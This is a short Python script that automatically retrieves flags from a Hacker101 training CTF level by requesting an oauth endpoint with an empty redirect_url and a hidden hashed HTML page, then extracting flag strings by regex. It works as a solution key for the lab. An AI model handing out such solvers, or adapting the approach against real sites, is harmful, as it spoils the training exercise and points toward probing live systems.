# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags.\033[0m")
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/oauth?redirect_url=").text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/oauth?redirect_url=").text) else None}$FLAG$')
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/48ce217fea4529a070a9d3e3c87db512b1596d413e580f7b2e1eab65f3948ab8.html").text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/48ce217fea4529a070a9d3e3c87db512b1596d413e580f7b2e1eab65f3948ab8.html").text) else None}$FLAG$')
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")